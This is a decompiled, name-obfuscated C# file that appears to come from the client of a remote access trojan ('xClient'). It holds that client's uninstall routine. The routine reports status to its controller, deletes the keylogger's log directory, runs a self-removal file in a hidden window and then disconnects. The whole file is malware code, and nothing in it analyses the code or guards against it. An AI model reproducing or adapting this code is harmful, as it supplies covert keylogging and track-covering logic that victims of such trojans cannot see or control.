using System;
using System.Diagnostics;
using System.IO;
using xClient.Core.Networking;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Utilities;

// Token: 0x02000010 RID: 16
public static class GClass14
{
	// Token: 0x06000078 RID: 120 RVA: 0x000060E0 File Offset: 0x000042E0
	public static void smethod_0(Client client)
	{
		if (!GClass35.bool_0)
		{
			new SetStatus("Uninstallation failed: Installation is not enabled").Execute(client);
			return;
		}
		GClass14.smethod_1();
		if (GClass35.bool_1)
		{
			GClass16.smethod_2();
		}
		try
		{
			if (!GClass4.smethod_5(GClass0.CurrentPath))
			{
				new SetStatus("Uninstallation failed: File is read-only").Execute(client);
			}
			string text = GClass4.smethod_3(GClass35.bool_0 && GClass35.bool_2);
			if (!string.IsNullOrEmpty(text))
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = true,
					FileName = text
				};
				Process.Start(startInfo);
			}
		}
		finally
		{
			GClass0.Disconnect = true;
			client.Disconnect();
		}
	}

	// Token: 0x06000079 RID: 121 RVA: 0x0000619C File Offset: 0x0000439C
	public static void smethod_1()
	{
		if (Directory.Exists(Keylogger.LogDirectory))
		{
			try
			{
				Directory.Delete(Keylogger.LogDirectory, true);
			}
			catch
			{
			}
		}
	}
}
